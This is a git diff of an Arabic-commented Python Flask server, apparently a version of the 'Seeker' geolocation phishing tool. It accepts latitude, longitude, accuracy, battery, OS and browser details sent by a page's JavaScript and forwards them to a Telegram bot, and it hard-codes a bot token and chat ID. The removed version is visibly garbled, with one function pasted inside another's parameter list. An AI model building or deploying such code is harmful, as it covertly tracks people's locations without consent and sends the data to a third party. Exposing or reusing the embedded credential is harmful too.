@@ -1,47 +1,43 @@
+from flask import Flask, request, render_template
 import requests
-from flask import Flask, request
 
 app = Flask(__name__)
 
-# بيانات البوت واليوزر
-TG_TOKEN = "7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y"
-CHAT_ID = "7961048427"
-TG_API = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+# إعدادات البوت
+BOT_TOKEN = '7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y'
+CHAT_ID = '7961048427'
 
-@app.route("/")
-def index():
-    return "Seeker is running!"
-
-@app.route("/location", methods=["POST"])
-def location(import requests
-
+# دالة إرسال رسالة لتلقرام
 def send_to_telegram(message):
-    bot_token = '7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y'
-    chat_id = '7961048427'
-    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
-    payload = {'chat_id': chat_id, 'text': message}
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+    payload = {'chat_id': CHAT_ID, 'text': message}
     requests.post(url, data=payload)
 
+# الصفحة الرئيسية
+@app.route('/')
+def index():
+    return render_template('index.html')  # تأكد أن عندك index.html داخل مجلد templates
+
+# استقبال النتائج من الجافاسكربت
 @app.route('/result', methods=['POST'])
 def result():
     data = request.json
-    location_data = f"""📍 موقع جديد:
 
-🔸 Lat: {data.get('lat')}
-🔹 Lon: {data.get('lon')}
-🕒 Time: {data.get('timestamp')}
-📶 Accuracy: {data.get('accuracy')}m
-🔋 Battery: {data.get('battery')}%
-📱 OS: {data.get('os')} | {data.get('browser')}
+    # إعداد الرسالة
+    location_data = f"""📍 موقع جديد تم التقاطه:
+
+🔸 خط العرض: {data.get('lat')}
+🔹 خط الطول: {data.get('lon')}
+🕒 الوقت: {data.get('timestamp')}
+📶 الدقة: {data.get('accuracy')} متر
+🔋 البطارية: {data.get('battery')}%
+📱 النظام: {data.get('os')} | المتصفح: {data.get('browser')}
 """
-    print(location_data)
+
+    print(location_data)  # يظهر في الكونسول على Render
     send_to_telegram(location_data)
-    return 'OK'):
-    data = request.get_json()
-    lat = data.get("latitude")
-    lon = data.get("longitude")
-    msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
-    print("🚀 Sending to Telegram:", msg)
-    response = requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
-    print("📩 Telegram response:", response.text)
-    return {"status": "تم الاستلام"}
+    return 'OK'
+
+# تشغيل التطبيق على بورت 5000
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
